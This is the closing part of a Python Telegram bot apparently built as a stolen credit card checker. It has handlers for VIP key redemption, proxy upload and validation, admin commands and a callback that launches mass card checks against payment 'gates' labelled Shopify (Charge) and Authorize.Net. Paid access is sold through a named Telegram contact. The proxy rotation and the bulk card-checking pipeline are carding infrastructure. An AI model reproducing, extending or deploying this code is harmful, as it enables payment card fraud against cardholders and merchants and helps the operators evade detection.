    key = context.args[0].strip()
    keys = await load_keys()
    if key not in keys:
        await styled_reply(update, f"<b>{CE_CLOWN} {sf('Key not found in database.')}</b>", use_gif=False)
        return
    kdata = keys[key]
    status = "Used" if kdata["used"] else "Active/Unused"
    used_by = kdata.get("used_by", "-")
    expiry = kdata.get("expiry", "-")
    await styled_reply(update, f"<b>🔑 Key Details:</b>\n\n├ <b>Key:</b> <code>{key}</code>\n├ <b>Tier:</b> <code>{kdata['tier']}</code>\n├ <b>Status:</b> <code>{status}</code>\n├ <b>Used By:</b> <code>{used_by}</code>\n╰ <b>Expiry:</b> <code>{expiry}</code>", use_gif=False)

async def redeem_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not context.args:
        await styled_reply(update, f"<b>{CE_DIAMOND} {sf('Redeem Key')}</b>\n\n╰ <code>/redeem [VIP-KEY]</code>", use_gif=False)
        return
    key = context.args[0].strip()
    keys = await load_keys()
    if key not in keys:
        await styled_reply(update, f"<b>{CE_CLOWN} {sf('Invalid key or already redeemed!')}</b>", use_gif=False)
        return
    
    kdata = keys[key]
    if kdata["used"]:
        await styled_reply(update, f"<b>{CE_CLOWN} {sf('Key has already been used.')}</b>", use_gif=False)
        return
        
    kdata["used"] = True
    kdata["used_by"] = uid
    kdata["expiry"] = (datetime.now() + timedelta(days=30)).strftime("%Y-%m-%d")
    await save_keys(keys)
    
    await ensure_user(uid)
    await set_user_plan(uid, kdata["tier"])
    await styled_reply(update, f"<b>{CE_PARTY} {sf('Key Redeemed Successfully!')}</b>\n\n├ {sf('Plan Activated')}: <code>{sf(kdata['tier'])}</code>\n╰ {sf('Expiry date')}: <code>30 Days from now</code>", use_gif=True, specific_gif=REDEEM_GIF)

# ====================== PROXY MANAGER ONSITE HANDLERS ======================
async def addpxy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    await ensure_user(uid)
    
    if update.message.document:
        doc = update.message.document
        if doc.file_size > 1024 * 1024:
            await styled_reply(update, f"<b>{CE_BOOM} {sf('File is too large! (Max 1MB)')}</b>", use_gif=False)
            return
        f = await context.bot.get_file(doc.file_id)
        fp = f"proxies_temp_{uid}.txt"
        await f.download_to_drive(fp)
        try:
            async with aiofiles.open(fp, "r", encoding="utf-8", errors="ignore") as file: p_text = await file.read()
        except:
            async with aiofiles.open(fp, "r", encoding="latin-1", errors="ignore") as file: p_text = await file.read()
        if os.path.exists(fp): os.remove(fp)
    else:
        if not context.args:
            await styled_reply(update, f"<b>{CE_GEAR} {sf('Proxy Manager')}</b>\n\n├ {sf('Please send proxies after command:')}\n├ <code>/addpxy host:port:user:pass</code>\n╰ {sf('Or reply to a proxy text file.')}", use_gif=False)
            return
        p_text = "\n".join(context.args)

    lines = p_text.split("\n")
    added = 0
    for l in lines:
        parsed = parse_proxy_format(l)
        if parsed:
            await add_proxy_db(uid, parsed['proxy_url'])
            added += 1
            
    await styled_reply(update, f"<b>{CE_CHECK} {sf('Successfully parsed and saved')} <code>{added}</code> {sf('HTTP/HTTPS proxies to your account.')}</b>", use_gif=False)

async def proxy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    await ensure_user(uid)
    proxies = await get_all_user_proxies(uid)
    if not proxies:
        await styled_reply(update, f"<b>{CE_CLOWN} {sf('You do not have any proxies in database. Use /addpxy')}</b>", use_gif=False)
        return
    t_proxies = "\n".join([f"├ <code>{escape_html(p['proxy_url'])}</code>" for p in proxies[:15]])
    more = f"\n╰ ... <i>and {len(proxies)-15} more proxies</i>" if len(proxies) > 15 else ""
    await styled_reply(update, f"<b>{CE_GEAR} {sf('Your Active Proxies')} (Total: {len(proxies)}):</b>\n\n{t_proxies}{more}", use_gif=False)

async def rmpxy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    await ensure_user(uid)
    await clear_all_proxies(uid)
    await styled_reply(update, f"<b>{CE_CHECK} {sf('All database proxies deleted for your account.')}</b>", use_gif=False)

async def checkpxy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    proxies = await get_all_user_proxies(uid)
    if not proxies:
        await styled_reply(update, f"<b>{CE_CLOWN} {sf('No proxies to clean.')}</b>", use_gif=False)
        return
        
    pm = await styled_reply(update, f"<b>{CE_HOURGLASS} {sf('Cleaning and validating proxies...')}</b>", use_gif=False)
    
    working = []
    dead_count = 0
    
    async def validate_one(p_dict):
        nonlocal dead_count
        parsed = parse_proxy_format(p_dict['proxy_url'])
        if not parsed:
            dead_count += 1
            return
        try:
            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(connector=connector) as sess:
                async with sess.get("https://api.ipify.org", proxy=parsed['proxy_url'], timeout=10) as resp:
                    if resp.status == 200:
                        working.append(p_dict['proxy_url'])
                        return
        except Exception: pass
        dead_count += 1

    tasks = [asyncio.create_task(validate_one(p)) for p in proxies]
    await asyncio.gather(*tasks)
    
    await clear_all_proxies(uid)
    for wp in working:
        await add_proxy_db(uid, wp)
        
    await styled_edit(pm, f"<b>{CE_CHECK} {sf('Proxy Cleaning Completed')}</b>\n\n├ <b>{sf('Active/Live')}:</b> <code>{len(working)}</code>\n╰ <b>{sf('Removed/Dead')}:</b> <code>{dead_count}</code>")

# ====================== ADMIN AND MANAGEMENT HANDLERS ======================
async def users_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_ID: return
    active_runs = len(ACTIVE_MTXT_PROCESSES)
    await styled_reply(update, f"<b>⚙️ System Status:</b>\n\n├ <b>Active Threads:</b> <code>{active_runs}</code>\n╰ <b>Worker Pool Limit:</b> <code>{WORKERS} Tasks</code>", use_gif=False)

async def checkgates_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_ID: return
    await styled_reply(update, f"<b>🛡️ Active Gates:</b>\n\n├ <code>Shopify (Charge)</code> - Active\n╰ <code>Authorize.Net</code> - Active", use_gif=False)

async def maint_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global _MAINTENANCE_MODE
    if update.effective_user.id not in ADMIN_ID: return
    _MAINTENANCE_MODE = not _MAINTENANCE_MODE
    state_str = "ENABLED" if _MAINTENANCE_MODE else "DISABLED"
    await styled_reply(update, f"<b>🛡️ Maintenance Mode: <code>{state_str}</code></b>", use_gif=False)

# ====================== CALLBACK QUERIES AND WIDGET ROUTERS ======================
async def handle_callback_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global _MAINTENANCE_MODE
    query = update.callback_query
    uid = query.from_user.id
    data = str(query.data)
    
    await query.answer()
    
    if _MAINTENANCE_MODE and uid not in ADMIN_ID:
        await query.message.reply_text("<b>System is under maintenance. Please try again later.</b>", parse_mode=ParseMode.HTML)
        return
        
    if data == "check_joined":
        is_joined = await is_user_joined(uid, context.bot)
        if is_joined:
            _JOIN_CACHE[uid] = time.time()
            await query.message.delete()
            await send_welcome_menu(context.bot, uid, await get_user_plan(uid), get_cc_limit(await get_user_plan(uid), uid))
        else:
            await query.answer("You have not joined the official channels yet!", show_alert=True)
            
    elif data == "show_plans":
        t = f"<b>━━━ {CE_STAR} {sf('VIP PLANS & ACCESS')} ━━━</b>\n\n"
        for pk, pi in PLANS.items():
            t += f"<b>{CE_DIAMOND} {sf(pi['name'])}:</b>\n ├ {sf('Duration')}: <code>{pi['duration_days']} Days</code>\n ├ {sf('Price')}: <code>{pi['price']}</code>\n ╰ {sf('Limit')}: <code>{get_cc_limit(pi['tier'])} CCs</code>\n\n"
        t += f"<i>{sf('To purchase access, contact the Owner:')} @Dddadddyttt</i>"
        await query.message.reply_text(t, parse_mode=ParseMode.HTML)
        
    elif data == "prompt_redeem":
        await query.message.reply_text(f"<b>{CE_DIAMOND} {sf('Redeem Key')}</b>\n\n╰ {sf('Please type: /redeem [VIP-KEY]')}", parse_mode=ParseMode.HTML)
        
    elif data.startswith("gate:"):
        gate_name = data.split(":")[-1]
        if gate_name == "cancel":
            PENDING_FILES.pop(uid, None)
            await styled_edit(query.message, f"<b>{CE_BOOM} {sf('Process cancelled by user.')}</b>")
            return
            
        cards = PENDING_FILES.pop(uid, None)
        if not cards:
            await query.message.reply_text("No cards found or cache has expired.", parse_mode=ParseMode.HTML)
            return
            
        asyncio.create_task(run_mass_check_task(uid, cards, gate_name, context.bot, query.message))

# ====================== SYSTEM APPLICATION INITIALIZATION ======================
def main():
    if not BOT_TOKEN:
        logger.error("No BOT_TOKEN set in environment variables.")
        sys.exit(1)
        
    # تهيئة قواعد البيانات بشكل متزامن وآمن قبل تفعيل البوت
    try:
        asyncio.run(init_db())
    except Exception as e:
        logger.error(f"Failed to initialize database: {e}")
    
    app = Application.builder().token(BOT_TOKEN).defaults(Defaults(parse_mode=ParseMode.HTML)).build()
    
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("info", info_cmd))
    app.add_handler(CommandHandler("plan", plan_cmd))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CommandHandler("fb", fb_cmd))
    app.add_handler(CommandHandler("addpxy", addpxy_cmd))
    app.add_handler(CommandHandler("proxy", proxy_cmd))
    app.add_handler(CommandHandler("rmpxy", rmpxy_cmd))
    app.add_handler(CommandHandler("checkpxy", checkpxy_cmd))
    app.add_handler(CommandHandler("gen", gen_cmd))
    app.add_handler(CommandHandler("validate", validate_cmd))
    app.add_handler(CommandHandler("redeem", redeem_cmd))
    app.add_handler(CommandHandler("users", users_cmd))
    app.add_handler(CommandHandler("checkgates", checkgates_cmd))
    app.add_handler(CommandHandler("maint", maint_cmd))
    
    app.add_handler(CallbackQueryHandler(handle_callback_query))
    
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), auto_file_check_cmd))
    
    app.add_error_handler(global_error_handler)
    
    logger.info("Bot started successfully and waiting for inputs...")
    app.run_polling()

if __name__ == "__main__":
    main()
